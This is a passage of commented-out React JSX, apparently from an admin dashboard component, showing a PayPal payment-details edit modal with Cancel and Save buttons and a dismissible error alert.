//       className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
//       value={paypalDetails.paymentNote}
//       onChange={(e) =>
//         setPaypalDetails({ ...paypalDetails, paymentNote: e.target.value })
//       }
//     />
//     <div className="flex justify-end space-x-3">
//       <button
//         onClick={() => setIsPaypalModalOpen(false)}
//         className="px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
//       >
//         Cancel
//       </button>
//       <button
//         onClick={handleEditPaypalDetails}
//         disabled={isLoading}
//         className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
//       >
//         {isLoading && <Loader2 className="animate-spin -ml-1 mr-2 h-4 w-4" />}
//         Save Changes
//       </button>
//     </div>
//   </div>
// </Modal>

// {/* Error Alert */}
// {error && (
//   <div className="fixed bottom-4 right-4 max-w-sm w-full bg-white rounded-lg shadow-lg p-4 border-l-4 border-red-500">
//     <div className="flex items-start">
//       <div className="ml-3 w-0 flex-1">
//         <p className="text-sm text-red-600">{error}</p>
//       </div>
//       <div className="ml-4 flex-shrink-0 flex">
//         <button
//           onClick={() => setError(null)}
//           className="inline-flex text-gray-400 hover:text-gray-500"
//         >
//           <X className="h-5 w-5" />
//         </button>
//       </div>
//     </div>
//   </div>
// )}
// </div>
// );
// };

// export default AdminDashboard;
